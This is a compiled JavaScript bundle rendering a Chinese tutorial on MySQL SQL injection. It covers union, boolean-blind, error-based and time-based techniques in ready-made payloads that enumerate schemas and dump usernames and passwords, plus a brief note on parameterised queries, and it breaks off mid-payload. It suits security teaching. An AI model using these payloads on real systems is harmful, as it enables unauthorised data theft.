(window.__LOADABLE_LOADED_CHUNKS__=window.__LOADABLE_LOADED_CHUNKS__||[]).push([[23],{153:function(e,a,n){"use strict";n.r(a),n.d(a,"default",(function(){return b}));n(130),n(0);var t=n(93);function s(){return(s=Object.assign||function(e){for(var a=1;a<arguments.length;a++){var n=arguments[a];for(var t in n)Object.prototype.hasOwnProperty.call(n,t)&&(e[t]=n[t])}return e}).apply(this,arguments)}function c(e,a){if(null==e)return{};var n,t,s=function(e,a){if(null==e)return{};var n,t,s={},c=Object.keys(e);for(t=0;t<c.length;t++)n=c[t],a.indexOf(n)>=0||(s[n]=e[n]);return s}(e,a);if(Object.getOwnPropertySymbols){var c=Object.getOwnPropertySymbols(e);for(t=0;t<c.length;t++)n=c[t],a.indexOf(n)>=0||Object.prototype.propertyIsEnumerable.call(e,n)&&(s[n]=e[n])}return s}var p={},o="wrapper";function b(e){var a=e.components,n=c(e,["components"]);return Object(t.b)(o,s({},p,n,{components:a,mdxType:"MDXLayout"}),Object(t.b)("h1",{className:"__internal",id:"sql注入漏洞"},"SQL注入漏洞",Object(t.b)("a",s({parentName:"h1"},{href:"#sql%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E","aria-hidden":!0,className:"anchor"}),"#")),Object(t.b)("h2",{className:"__internal",id:"sql注入漏洞基本原理"},"SQL注入漏洞基本原理",Object(t.b)("a",s({parentName:"h2"},{href:"#sql%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E%E5%9F%BA%E6%9C%AC%E5%8E%9F%E7%90%86","aria-hidden":!0,className:"anchor"}),"#")),Object(t.b)("p",null,"Web应用程序对用户输入的数据校验处理不严或者根本没有校验，致使用户可以拼接执行SQL命令。"),Object(t.b)("p",null,"可能导致数据泄露或数据破坏，缺乏可审计性，甚至导致完全接管主机。"),Object(t.b)("p",null,Object(t.b)("strong",{parentName:"p"},"根据注入技术分类有以下五种：")),Object(t.b)("ul",null,Object(t.b)("li",s({parentName:"ul"},{className:"__internal"}),"布尔型盲注：根据返回页面判断条件真假"),Object(t.b)("li",s({parentName:"ul"},{className:"__internal"}),"时间型盲注：用页面返回时间是否增加判断是否存在注入"),Object(t.b)("li",s({parentName:"ul"},{className:"__internal"}),"基于错误的注入：页面会返回错误信息"),Object(t.b)("li",s({parentName:"ul"},{className:"__internal"}),"联合查询注入：可以使用union的情况下"),Object(t.b)("li",s({parentName:"ul"},{className:"__internal"}),"堆查询注入：可以同时执行多条语句")),Object(t.b)("h2",{className:"__internal",id:"防御方法"},"防御方法",Object(t.b)("a",s({parentName:"h2"},{href:"#%E9%98%B2%E5%BE%A1%E6%96%B9%E6%B3%95","aria-hidden":!0,className:"anchor"}),"#")),Object(t.b)("p",null,"使用参数化查询。数据库服务器不会把参数的内容当作SQL指令的一部分来拼接执行；而是在数据库完成SQL指令的编译后才套用参数运行(预编译)。避免数据变成代码被执行，时刻分清代码和数据的界限。"),Object(t.b)("h2",{className:"__internal",id:"mysql基础知识"},"MySQL基础知识",Object(t.b)("a",s({parentName:"h2"},{href:"#mysql%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86","aria-hidden":!0,className:"anchor"}),"#")),Object(t.b)("p",null,Object(t.b)("strong",{parentName:"p"},"MySQL默认的数据库有：")," ",Object(t.b)("inlineCode",{parentName:"p"},"sys"),"、",Object(t.b)("inlineCode",{parentName:"p"},"mysql"),"、",Object(t.b)("inlineCode",{parentName:"p"},"performance_schema"),"、",Object(t.b)("inlineCode",{parentName:"p"},"information_schema")),Object(t.b)("p",null,Object(t.b)("strong",{parentName:"p"},Object(t.b)("inlineCode",{parentName:"strong"},"information_schema"),"存放着所有的数据库信息(5.0版本以上才有这个库)")),Object(t.b)("p",null,"这个库有3个表："),Object(t.b)("ul",null,Object(t.b)("li",s({parentName:"ul"},{className:"__internal"}),Object(t.b)("inlineCode",{parentName:"li"},"SCHEMATA ")," 该表存放用户创建的所有数据库库名",Object(t.b)("ul",{parentName:"li"},Object(t.b)("li",s({parentName:"ul"},{className:"__internal"}),Object(t.b)("inlineCode",{parentName:"li"},"SCHEMA_NAME")," 字段记录数据库库名"))),Object(t.b)("li",s({parentName:"ul"},{className:"__internal"}),Object(t.b)("inlineCode",{parentName:"li"},"TABLES")," 该表存放用户创建的所有数据库库名和表名",Object(t.b)("ul",{parentName:"li"},Object(t.b)("li",s({parentName:"ul"},{className:"__internal"}),Object(t.b)("inlineCode",{parentName:"li"},"TABLE_SCHEMA")," 字段记录数据库名"),Object(t.b)("li",s({parentName:"ul"},{className:"__internal"}),Object(t.b)("inlineCode",{parentName:"li"},"TABLE_NAME")," 字段记录表名"))),Object(t.b)("li",s({parentName:"ul"},{className:"__internal"}),Object(t.b)("inlineCode",{parentName:"li"},"COLUMNS")," 该表存放用户创建的所有数据库库名、表名和字段名",Object(t.b)("ul",{parentName:"li"},Object(t.b)("li",s({parentName:"ul"},{className:"__internal"}),Object(t.b)("inlineCode",{parentName:"li"},"TABLE_SCHEMA")," 字段记录数据库名"),Object(t.b)("li",s({parentName:"ul"},{className:"__internal"}),Object(t.b)("inlineCode",{parentName:"li"},"TABLE_NAME")," 字段记录表名"),Object(t.b)("li",s({parentName:"ul"},{className:"__internal"}),Object(t.b)("inlineCode",{parentName:"li"},"COLUMN_NAME")," 字段记录字段名")))),Object(t.b)("h2",{className:"__internal",id:"查找sql注入漏洞"},"查找SQL注入漏洞",Object(t.b)("a",s({parentName:"h2"},{href:"#%E6%9F%A5%E6%89%BEsql%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E","aria-hidden":!0,className:"anchor"}),"#")),Object(t.b)("h3",{className:"__internal",id:"union注入"},"Union注入",Object(t.b)("a",s({parentName:"h3"},{href:"#union%E6%B3%A8%E5%85%A5","aria-hidden":!0,className:"anchor"}),"#")),Object(t.b)("p",null,"以MySQL注入为例"),Object(t.b)("p",null,Object(t.b)("strong",{parentName:"p"},"1、在参数后添加引号尝试报错，并用",Object(t.b)("inlineCode",{parentName:"strong"},"and 1=1#"),"和",Object(t.b)("inlineCode",{parentName:"strong"},"and 1=2#"),"测试报错")),Object(t.b)("div",{className:"rcpress-highlight","data-language":"text"},Object(t.b)("pre",s({parentName:"div"},{className:"language-text"}),Object(t.b)("code",s({parentName:"pre"},{className:"language-text"}),"?id=1' and 1=1#        页面返回正常\n?id=1' and 1=2#        页面返回不正常"))),Object(t.b)("p",null,Object(t.b)("strong",{parentName:"p"},"2、利用",Object(t.b)("inlineCode",{parentName:"strong"},"order by"),"猜测字段")),Object(t.b)("div",{className:"rcpress-highlight","data-language":"text"},Object(t.b)("pre",s({parentName:"div"},{className:"language-text"}),Object(t.b)("code",s({parentName:"pre"},{className:"language-text"}),"?id=1%27%20order%0aby%0c2%23    --返回正常\n--上边用%0a和%0c的URL编码可以代替空格，到数据库后就是空格的意思\n?id=1%27 order by 3#            --返回正常\n?id=1%27 order by 4#            --返回正常\n?id=1%27 order by 5#            --返回错误\n\n--这就证明字段总数为4"))),Object(t.b)("p",null,Object(t.b)("strong",{parentName:"p"},"3、利用union联合查询")),Object(t.b)("div",{className:"rcpress-highlight","data-language":"text"},Object(t.b)("pre",s({parentName:"div"},{className:"language-text"}),Object(t.b)("code",s({parentName:"pre"},{className:"language-text"}),"?id=-1%27 union select 1,2,3,4#        --看哪个字段可以显示信息，利用它获取数据库信息\n--修改id为一个不存在的id，强行报错\n--因为代码默认只返回第一条结果，不会返回 union select 的结果"))),Object(t.b)("p",null,Object(t.b)("strong",{parentName:"p"},"4、获取数据库信息")),Object(t.b)("div",{className:"rcpress-highlight","data-language":"text"},Object(t.b)("pre",s({parentName:"div"},{className:"language-text"}),Object(t.b)("code",s({parentName:"pre"},{className:"language-text"}),"id=-1%27 union select 1,2,3,CONCAT_WS(CHAR(32,58,32),user(),database(),version())#\n\nuser()        --获取数据库用户名\ndatabase()    --获取数据库名\nversion()    --获取数据库版本信息\nconcat_ws(separator,str1,str2,...)    --含有分隔符地连接字符串 \n--里边这的separator分隔符，用 char() 函数把 空格:空格 的ASCII码输出\n\n--其它信息\n@@datadir                --数据库路径\n@@version_compile_os    --操作系统版本"))),Object(t.b)("p",null,Object(t.b)("strong",{parentName:"p"},"5、查询数据库的表")),Object(t.b)("div",{className:"rcpress-highlight","data-language":"text"},Object(t.b)("pre",s({parentName:"div"},{className:"language-text"}),Object(t.b)("code",s({parentName:"pre"},{className:"language-text"}),"id=-1%27 union select 1,2,3,table_name from information_schema.tables where table_schema='sqli' limit 0,1#\n\n--table_schema=数据库名16进制或者用单引号括起来\n--改变limit 0,1中前一个参数，得到所有表"))),Object(t.b)("p",null,Object(t.b)("strong",{parentName:"p"},"6、查询数据库字段")),Object(t.b)("div",{className:"rcpress-highlight","data-language":"text"},Object(t.b)("pre",s({parentName:"div"},{className:"language-text"}),Object(t.b)("code",s({parentName:"pre"},{className:"language-text"}),"id=-1%27 union select 1,2,3,column_name from information_schema.columns where table_schema=%27数据库名%27 and table_name=%27表名%27limit 0,1#"))),Object(t.b)("p",null,Object(t.b)("strong",{parentName:"p"},"7、脱裤，获取数据")),Object(t.b)("div",{className:"rcpress-highlight","data-language":"text"},Object(t.b)("pre",s({parentName:"div"},{className:"language-text"}),Object(t.b)("code",s({parentName:"pre"},{className:"language-text"}),"union select 1,2,3,group_concat(name,password)%20from%20sc#\n--用字段名从表中取数据\ngroup_concat(str1,str2,...)    --连接一个组的所有字符串"))),Object(t.b)("h3",{className:"__internal",id:"boolean注入"},"Boolean注入",Object(t.b)("a",s({parentName:"h3"},{href:"#boolean%E6%B3%A8%E5%85%A5","aria-hidden":!0,className:"anchor"}),"#")),Object(t.b)("p",null,"布尔型盲注，页面不返回查询信息的数据，只能通过页面返回信息的真假条件判断是否存在注入。"),Object(t.b)("p",null,Object(t.b)("strong",{parentName:"p"},"1、在参数后添加引号尝试报错，并用",Object(t.b)("inlineCode",{parentName:"strong"},"and 1=1#"),"和",Object(t.b)("inlineCode",{parentName:"strong"},"and 1=2#"),"测试报错")),Object(t.b)("div",{className:"rcpress-highlight","data-language":"text"},Object(t.b)("pre",s({parentName:"div"},{className:"language-text"}),Object(t.b)("code",s({parentName:"pre"},{className:"language-text"}),"?id=1' and 1=1#        页面返回正常\n?id=1' and 1=2#        页面返回不正常"))),Object(t.b)("p",null,Object(t.b)("strong",{parentName:"p"},"2、判断数据库名的长度")),Object(t.b)("div",{className:"rcpress-highlight","data-language":"text"},Object(t.b)("pre",s({parentName:"div"},{className:"language-text"}),Object(t.b)("code",s({parentName:"pre"},{className:"language-text"}),"1'and length(database())>=1--+        页面返回正常\n1'and length(database())>=13--+        页面返回正常\n1'and length(database())>=14--+        页面返回错误\n\n由此判断得到数据库名的长度是13个字符"))),Object(t.b)("p",null,Object(t.b)("strong",{parentName:"p"},"3、猜解数据库名")),Object(t.b)("p",null,"使用逐字符判断的方式获取数据库名；数据库名的范围一般在az、09之内，可能还会有特殊字符 “_”、”-“ 等，这里的字母不区分大小写。"),Object(t.b)("div",{className:"rcpress-highlight","data-language":"text"},Object(t.b)("pre",s({parentName:"div"},{className:"language-text"}),Object(t.b)("code",s({parentName:"pre"},{className:"language-text"}),"' and substr(database(),1,1)='a'--+\n' and substr(database(),2,1)='a'--+\n\nsubstr 的用法和 limit 有区别，limit从 0 开始排序，这里从 1 开始排序。"))),Object(t.b)("p",null,"用Burp爆破字母a的位置，即可得到数据库名每个位置上的字符。"),Object(t.b)("p",null,Object(t.b)("strong",{parentName:"p"},"还可以用ASCII码查询")),Object(t.b)("p",null,"a 的ASCII码是97，在MySQL中使用ord函数转换ASCII，所以逐字符判断语句可改为："),Object(t.b)("div",{className:"rcpress-highlight","data-language":"text"},Object(t.b)("pre",s({parentName:"div"},{className:"language-text"}),Object(t.b)("code",s({parentName:"pre"},{className:"language-text"}),"' and ord(substr(database(),1,1))=97--+"))),Object(t.b)("p",null,Object(t.b)("strong",{parentName:"p"},"4、判断数据库表名")),Object(t.b)("div",{className:"rcpress-highlight","data-language":"text"},Object(t.b)("pre",s({parentName:"div"},{className:"language-text"}),Object(t.b)("code",s({parentName:"pre"},{className:"language-text"}),"' and substr((select table_name from information_schema.tables where table_schema='数据库名' limit 0,1),1,1)='a'--+\n\n--修改1,1前边的1~20，逐字符猜解出第一个表的名\n--修改limit的0,1前边的0~20，逐个猜解每个表"))),Object(t.b)("p",null,Object(t.b)("strong",{parentName:"p"},"5、判断数据库字段名")),Object(t.b)("div",{className:"rcpress-highlight","data-language":"text"},Object(t.b)("pre",s({parentName:"div"},{className:"language-text"}),Object(t.b)("code",s({parentName:"pre"},{className:"language-text"}),"' and substr((select column_name from information_schema.columns where table_schema='数据库名' and table_name='表名' limit 0,1),1,1)='a'--+\n\n--修改1,1前边的1~20，逐字符猜解出第一个字段的名\n--修改limit的0,1前边的0~20，逐个猜解每个字段"))),Object(t.b)("p",null,Object(t.b)("strong",{parentName:"p"},"6、取数据")),Object(t.b)("div",{className:"rcpress-highlight","data-language":"text"},Object(t.b)("pre",s({parentName:"div"},{className:"language-text"}),Object(t.b)("code",s({parentName:"pre"},{className:"language-text"}),"' and substr((select 字段名 from 表名 limit 0,1),1,1)='a'--+"))),Object(t.b)("p",null,"如果嫌用Burp慢的话，可以自己编写脚本，修改payload即可"),Object(t.b)("h3",{className:"__internal",id:"报错注入"},"报错注入",Object(t.b)("a",s({parentName:"h3"},{href:"#%E6%8A%A5%E9%94%99%E6%B3%A8%E5%85%A5","aria-hidden":!0,className:"anchor"}),"#")),Object(t.b)("p",null,"在SQL注入攻击过程中，服务器开启了错误回显，页面会返回错误信息，利用报错函数获取数据库数据。"),Object(t.b)("p",null,"常用的MySQL报错函数"),Object(t.b)("div",{className:"rcpress-highlight","data-language":"sql"},Object(t.b)("pre",s({parentName:"div"},{className:"language-sql"}),Object(t.b)("code",s({parentName:"pre"},{className:"language-sql"}),Object(t.b)("span",s({parentName:"code"},{className:"token comment"}),"--xpath语法错误"),"\nextractvalue",Object(t.b)("span",s({parentName:"code"},{className:"token punctuation"}),"("),Object(t.b)("span",s({parentName:"code"},{className:"token punctuation"}),")"),"    ",Object(t.b)("span",s({parentName:"code"},{className:"token comment"}),"--查询节点内容"),"\nupdatexml",Object(t.b)("span",s({parentName:"code"},{className:"token punctuation"}),"("),Object(t.b)("span",s({parentName:"code"},{className:"token punctuation"}),")"),"        ",Object(t.b)("span",s({parentName:"code"},{className:"token comment"}),"--修改查询到的内容"),"\n它们的第二个参数都要求是符合xpath语法的字符串\n如果不满足要求则会报错，并且将查询结果放在报错信息里\n\n",Object(t.b)("span",s({parentName:"code"},{className:"token comment"}),"--主键重复（duplicate entry）"),"\nfloor",Object(t.b)("span",s({parentName:"code"},{className:"token punctuation"}),"("),Object(t.b)("span",s({parentName:"code"},{className:"token punctuation"}),")"),"            ",Object(t.b)("span",s({parentName:"code"},{className:"token comment"}),"--返回小于等于该值的最大整数"),"\n只要是count，rand",Object(t.b)("span",s({parentName:"code"},{className:"token punctuation"}),"("),Object(t.b)("span",s({parentName:"code"},{className:"token punctuation"}),")"),"，",Object(t.b)("span",s({parentName:"code"},{className:"token keyword"}),"group")," ",Object(t.b)("span",s({parentName:"code"},{className:"token keyword"}),"by")," 三个连用就会造成这种主键重复报错"))),Object(t.b)("p",null,Object(t.b)("strong",{parentName:"p"},"1、尝试用单引号报错")),Object(t.b)("p",null,Object(t.b)("strong",{parentName:"p"},"2、获取数据库名")),Object(t.b)("div",{className:"rcpress-highlight","data-language":"sql"},Object(t.b)("pre",s({parentName:"div"},{className:"language-sql"}),Object(t.b)("code",s({parentName:"pre"},{className:"language-sql"}),"' ",Object(t.b)("span",s({parentName:"code"},{className:"token operator"}),"and")," updatexml",Object(t.b)("span",s({parentName:"code"},{className:"token punctuation"}),"("),Object(t.b)("span",s({parentName:"code"},{className:"token number"}),"1"),Object(t.b)("span",s({parentName:"code"},{className:"token punctuation"}),","),"concat",Object(t.b)("span",s({parentName:"code"},{className:"token punctuation"}),"("),Object(t.b)("span",s({parentName:"code"},{className:"token number"}),"0x7e"),Object(t.b)("span",s({parentName:"code"},{className:"token punctuation"}),","),Object(t.b)("span",s({parentName:"code"},{className:"token punctuation"}),"("),Object(t.b)("span",s({parentName:"code"},{className:"token keyword"}),"select")," ",Object(t.b)("span",s({parentName:"code"},{className:"token keyword"}),"database"),Object(t.b)("span",s({parentName:"code"},{className:"token punctuation"}),"("),Object(t.b)("span",s({parentName:"code"},{className:"token punctuation"}),")"),Object(t.b)("span",s({parentName:"code"},{className:"token punctuation"}),")"),Object(t.b)("span",s({parentName:"code"},{className:"token punctuation"}),","),Object(t.b)("span",s({parentName:"code"},{className:"token number"}),"0x7e"),Object(t.b)("span",s({parentName:"code"},{className:"token punctuation"}),")"),Object(t.b)("span",s({parentName:"code"},{className:"token punctuation"}),","),Object(t.b)("span",s({parentName:"code"},{className:"token number"}),"1"),Object(t.b)("span",s({parentName:"code"},{className:"token punctuation"}),")"),Object(t.b)("span",s({parentName:"code"},{className:"token comment"}),"--+"),"\n\n\n",Object(t.b)("span",s({parentName:"code"},{className:"token comment"}),'--0x7e是"~"符号的16进制，在这作为分隔符')))),Object(t.b)("p",null,Object(t.b)("strong",{parentName:"p"},"3、获取表名")),Object(t.b)("div",{className:"rcpress-highlight","data-language":"sql"},Object(t.b)("pre",s({parentName:"div"},{className:"language-sql"}),Object(t.b)("code",s({parentName:"pre"},{className:"language-sql"}),Object(t.b)("span",s({parentName:"code"},{className:"token string"}),"' and updatexml(1,concat(0x7e,(select table_name from information_schema.tables where table_schema='"),"数据库名' ",Object(t.b)("span",s({parentName:"code"},{className:"token keyword"}),"limit")," ",Object(t.b)("span",s({parentName:"code"},{className:"token number"}),"0"),Object(t.b)("span",s({parentName:"code"},{className:"token punctuation"}),","),Object(t.b)("span",s({parentName:"code"},{className:"token number"}),"1"),Object(t.b)("span",s({parentName:"code"},{className:"token punctuation"}),")"),Object(t.b)("span",s({parentName:"code"},{className:"token punctuation"}),","),Object(t.b)("span",s({parentName:"code"},{className:"token number"}),"0x7e"),Object(t.b)("span",s({parentName:"code"},{className:"token punctuation"}),")"),Object(t.b)("span",s({parentName:"code"},{className:"token punctuation"}),","),Object(t.b)("span",s({parentName:"code"},{className:"token number"}),"1"),Object(t.b)("span",s({parentName:"code"},{className:"token punctuation"}),")"),Object(t.b)("span",s({parentName:"code"},{className:"token comment"}),"--+")))),Object(t.b)("p",null,Object(t.b)("strong",{parentName:"p"},"4、获取字段名")),Object(t.b)("div",{className:"rcpress-highlight","data-language":"sql"},Object(t.b)("pre",s({parentName:"div"},{className:"language-sql"}),Object(t.b)("code",s({parentName:"pre"},{className:"language-sql"}),Object(t.b)("span",s({parentName:"code"},{className:"token string"}),"' and updatexml(1,concat(0x7e,(select column_name from information_schema.columns where table_schema='"),"数据库名",Object(t.b)("span",s({parentName:"code"},{className:"token string"}),"' and table_name='"),"表名' ",Object(t.b)("span",s({parentName:"code"},{className:"token keyword"}),"limit")," ",Object(t.b)("span",s({parentName:"code"},{className:"token number"}),"0"),Object(t.b)("span",s({parentName:"code"},{className:"token punctuation"}),","),Object(t.b)("span",s({parentName:"code"},{className:"token number"}),"1"),Object(t.b)("span",s({parentName:"code"},{className:"token punctuation"}),")"),Object(t.b)("span",s({parentName:"code"},{className:"token punctuation"}),","),Object(t.b)("span",s({parentName:"code"},{className:"token number"}),"0x7e"),Object(t.b)("span",s({parentName:"code"},{className:"token punctuation"}),")"),Object(t.b)("span",s({parentName:"code"},{className:"token punctuation"}),","),Object(t.b)("span",s({parentName:"code"},{className:"token number"}),"1"),Object(t.b)("span",s({parentName:"code"},{className:"token punctuation"}),")"),Object(t.b)("span",s({parentName:"code"},{className:"token comment"}),"--+")))),Object(t.b)("p",null,Object(t.b)("strong",{parentName:"p"},"5、取数据")),Object(t.b)("div",{className:"rcpress-highlight","data-language":"sql"},Object(t.b)("pre",s({parentName:"div"},{className:"language-sql"}),Object(t.b)("code",s({parentName:"pre"},{className:"language-sql"}),"' ",Object(t.b)("span",s({parentName:"code"},{className:"token operator"}),"and")," updatexml",Object(t.b)("span",s({parentName:"code"},{className:"token punctuation"}),"("),Object(t.b)("span",s({parentName:"code"},{className:"token number"}),"1"),Object(t.b)("span",s({parentName:"code"},{className:"token punctuation"}),","),"concat",Object(t.b)("span",s({parentName:"code"},{className:"token punctuation"}),"("),Object(t.b)("span",s({parentName:"code"},{className:"token number"}),"0x7e"),Object(t.b)("span",s({parentName:"code"},{className:"token punctuation"}),","),Object(t.b)("span",s({parentName:"code"},{className:"token punctuation"}),"("),Object(t.b)("span",s({parentName:"code"},{className:"token keyword"}),"select")," concat",Object(t.b)("span",s({parentName:"code"},{className:"token punctuation"}),"("),"username",Object(t.b)("span",s({parentName:"code"},{className:"token punctuation"}),","),Object(t.b)("span",s({parentName:"code"},{className:"token number"}),"0x3a"),Object(t.b)("span",s({parentName:"code"},{className:"token punctuation"}),","),"password",Object(t.b)("span",s({parentName:"code"},{className:"token punctuation"}),")")," ",Object(t.b)("span",s({parentName:"code"},{className:"token keyword"}),"from")," users ",Object(t.b)("span",s({parentName:"code"},{className:"token keyword"}),"limit")," ",Object(t.b)("span",s({parentName:"code"},{className:"token number"}),"0"),Object(t.b)("span",s({parentName:"code"},{className:"token punctuation"}),","),Object(t.b)("span",s({parentName:"code"},{className:"token number"}),"1"),Object(t.b)("span",s({parentName:"code"},{className:"token punctuation"}),")"),Object(t.b)("span",s({parentName:"code"},{className:"token punctuation"}),","),Object(t.b)("span",s({parentName:"code"},{className:"token number"}),"0x7e"),Object(t.b)("span",s({parentName:"code"},{className:"token punctuation"}),")"),Object(t.b)("span",s({parentName:"code"},{className:"token punctuation"}),","),Object(t.b)("span",s({parentName:"code"},{className:"token number"}),"1"),Object(t.b)("span",s({parentName:"code"},{className:"token punctuation"}),")"),Object(t.b)("span",s({parentName:"code"},{className:"token comment"}),"--+")))),Object(t.b)("p",null,"其他函数payload语法："),Object(t.b)("div",{className:"rcpress-highlight","data-language":"sql"},Object(t.b)("pre",s({parentName:"div"},{className:"language-sql"}),Object(t.b)("code",s({parentName:"pre"},{className:"language-sql"}),Object(t.b)("span",s({parentName:"code"},{className:"token comment"}),"--extractvalue"),"\n",Object(t.b)("span",s({parentName:"code"},{className:"token string"}),"' and extractvalue(1,concat(0x7e,(select database()),0x7e))--+\n\n--floor()\n'")," ",Object(t.b)("span",s({parentName:"code"},{className:"token operator"}),"and")," ",Object(t.b)("span",s({parentName:"code"},{className:"token punctuation"}),"("),Object(t.b)("span",s({parentName:"code"},{className:"token keyword"}),"select")," ",Object(t.b)("span",s({parentName:"code"},{className:"token number"}),"1")," ",Object(t.b)("span",s({parentName:"code"},{className:"token keyword"}),"from")," ",Object(t.b)("span",s({parentName:"code"},{className:"token punctuation"}),"("),Object(t.b)("span",s({parentName:"code"},{className:"token keyword"}),"select")," ",Object(t.b)("span",s({parentName:"code"},{className:"token function"}),"count"),Object(t.b)("span",s({parentName:"code"},{className:"token punctuation"}),"("),Object(t.b)("span",s({parentName:"code"},{className:"token operator"}),"*"),Object(t.b)("span",s({parentName:"code"},{className:"token punctuation"}),")"),Object(t.b)("span",s({parentName:"code"},{className:"token punctuation"}),","),"concat",Object(t.b)("span",s({parentName:"code"},{className:"token punctuation"}),"("),Object(t.b)("span",s({parentName:"code"},{className:"token keyword"}),"database"),Object(t.b)("span",s({parentName:"code"},{className:"token punctuation"}),"("),Object(t.b)("span",s({parentName:"code"},{className:"token punctuation"}),")"),Object(t.b)("span",s({parentName:"code"},{className:"token punctuation"}),","),"floor",Object(t.b)("span",s({parentName:"code"},{className:"token punctuation"}),"("),"rand",Object(t.b)("span",s({parentName:"code"},{className:"token punctuation"}),"("),Object(t.b)("span",s({parentName:"code"},{className:"token number"}),"0"),Object(t.b)("span",s({parentName:"code"},{className:"token punctuation"}),")"),Object(t.b)("span",s({parentName:"code"},{className:"token operator"}),"*"),Object(t.b)("span",s({parentName:"code"},{className:"token number"}),"2"),Object(t.b)("span",s({parentName:"code"},{className:"token punctuation"}),")"),Object(t.b)("span",s({parentName:"code"},{className:"token punctuation"}),")"),"x ",Object(t.b)("span",s({parentName:"code"},{className:"token keyword"}),"from")," information_schema",Object(t.b)("span",s({parentName:"code"},{className:"token punctuation"}),"."),Object(t.b)("span",s({parentName:"code"},{className:"token keyword"}),"tables")," ",Object(t.b)("span",s({parentName:"code"},{className:"token keyword"}),"group")," ",Object(t.b)("span",s({parentName:"code"},{className:"token keyword"}),"by")," x",Object(t.b)("span",s({parentName:"code"},{className:"token punctuation"}),")"),"a",Object(t.b)("span",s({parentName:"code"},{className:"token punctuation"}),")"),Object(t.b)("span",s({parentName:"code"},{className:"token comment"}),"--+")))),Object(t.b)("h3",{className:"__internal",id:"时间型盲注"},"时间型盲注",Object(t.b)("a",s({parentName:"h3"},{href:"#%E6%97%B6%E9%97%B4%E5%9E%8B%E7%9B%B2%E6%B3%A8","aria-hidden":!0,className:"anchor"}),"#")),Object(t.b)("p",null,"盲注是在SQL注入攻击过程中，服务器关闭了错误回显，单纯通过服务器返回内容的变化来判断是否存在SQL注入的方式 。"),Object(t.b)("p",null,"可以用",Object(t.b)("inlineCode",{parentName:"p"},"benchmark"),"，",Object(t.b)("inlineCode",{parentName:"p"},"sleep"),"等造成延时效果的函数。"),Object(t.b)("p",null,"如果",Object(t.b)("inlineCode",{parentName:"p"},"benkchmark"),"和",Object(t.b)("inlineCode",{parentName:"p"},"sleep"),"关键字被过滤了，可以让两个非常大的数据表做",Object(t.b)("a",s({parentName:"p"},{href:"https://blog.csdn.net/qq_32763643/article/details/79187931",target:"_blank"}),"笛卡尔积"),"产生大量的计算从而产生时间延迟；例如使用",Object(t.b)("a",s({parentName:"p"},{href:"https://www.anquanke.com/post/id/104319",target:"_blank"}),Object(t.b)("inlineCode",{parentName:"a"},"heavy query")),"进行延时注入"),Object(t.b)("p",null,"或者利用复杂的正则表达式去匹配一个超长字符串来产生时间延迟。"),Object(t.b)("p",null,Object(t.b)("strong",{parentName:"p"},"1、利用sleep判断数据库名长度")),Object(t.b)("div",{className:"rcpress-highlight","data-language":"sql"},Object(t.b)("pre",s({parentName:"div"},{className:"language-sql"}),Object(t.b)("code",s({parentName:"pre"},{className:"language-sql"}),Object(t.b)("span",s({parentName:"code"},{className:"token string"}),"' and sleep(5) and 1=1--+    页面返回不正常，延时5秒\n'")," ",Object(t.b)("span",s({parentName:"code"},{className:"token operator"}),"and")," sleep",Object(t.b)("span",s({parentName:"code"},{className:"token punctuation"}),"("),Object(t.b)("span",s({parentName:"code"},{className:"token number"}),"5"),Object(t.b)("span",s({parentName:"code"},{className:"token punctuation"}),")")," ",Object(t.b)("span",s({parentName:"code"},{className:"token operator"}),"and")," ",Object(t.b)("span",s({parentName:"code"},{className:"token number"}),"1"),Object(t.b)("span",s({parentName:"code"},{className:"token operator"}),"="),Object(t.b)("span",s({parentName:"code"},{className:"token number"}),"2"),Object(t.b)("span",s({parentName:"code"},{className:"token comment"}),"--+    页面返回不正常，不延时"),"\n\n",Object(t.b)("span",s({parentName:"code"},{className:"token operator"}),"and")," ",Object(t.b)("span",s({parentName:"code"},{className:"token keyword"}),"if"),Object(t.b)("span",s({parentName:"code"},{className:"token punctuation"}),"("),"length",Object(t.b)("span",s({parentName:"code"},{className:"token punctuation"}),"("),Object(t.b)("span",s({parentName:"code"},{className:"token keyword"}),"database"),Object(t.b)("span",s({parentName:"code"},{className:"token punctuation"}),"("),Object(t.b)("span",s({parentName:"code"},{className:"token punctuation"}),")"),Object(t.b)("span",s({parentName:"code"},{className:"token punctuation"}),")"),Object(t.b)("span",s({parentName:"code"},{className:"token operator"}),">"),Object(t.b)("span",s({parentName:"code"},{className:"token number"}),"1"),Object(t.b)("span",s({parentName:"code"},{className:"token punctuation"}),","),"sleep",Object(t.b)("span",s({parentName:"code"},{className:"token punctuation"}),"("),Object(t.b)("span",s({parentName:"code"},{className:"token number"}),"5"),Object(t.b)("span",s({parentName:"code"},{className:"token punctuation"}),")"),Object(t.b)("span",s({parentName:"code"},{className:"token punctuation"}),","),Object(t.b)("span",s({parentName:"code"},{className:"token number"}),"1"),Object(t.b)("span",s({parentName:"code"},{className:"token punctuation"}),")"),"\n",Object(t.b)("span",s({parentName:"code"},{className:"token comment"}),"--if(条件表达式，真，假) --C语言的三目运算符类似")))),Object(t.b)("p",null,Object(t.b)("strong",{parentName:"p"},"2、获取数据库名")),Object(t.b)("div",{className:"rcpress-highlight","data-language":"sql"},Object(t.b)("pre",s({parentName:"div"},{className:"language-sql"}),Object(t.b)("code",s({parentName:"pre"},{className:"language-sql"}),Object(t.b)("span",s({parentName:"code"},{className:"token operator"}),"and")," ",Object(t.b)("span",s({parentName:"code"},{className:"token keyword"}),"if"),Object(t.b)("span",s({parentName:"code"},{className:"token punctuation"}),"("),"substr",Object(t.b)("span",s({parentName:"code"},{className:"token punctuation"}),"("),Object(t.b)("span",s({parentName:"code"},{className:"token keyword"}),"database"),Object(t.b)("span",s({parentName:"code"},{className:"token punctuation"}),"("),Object(t.b)("span",s({parentName:"code"},{className:"token punctuation"}),")"),Object(t.b)("span",s({parentName:"code"},{className:"token punctuation"}),","),Object(t.b)("span",s({parentName:"code"},{className:"token number"}),"1"),Object(t.b)("span",s({parentName:"code"},{className:"token punctuation"}),","),Object(t.b)("span",s({parentName:"code"},{className:"token number"}),"1"),Object(t.b)("span",s({parentName:"code"},{className:"token punctuation"}),")"),Object(t.b)("span",s({parentName:"code"},{className:"token operator"}),"="),Object(t.b)("span",s({parentName:"code"},{className:"token string"}),"'a'"),Object(t.b)("span",s({parentName:"code"},{className:"token punctuation"}),","),"sleep",Object(t.b)("span",s({parentName:"code"},{className:"token 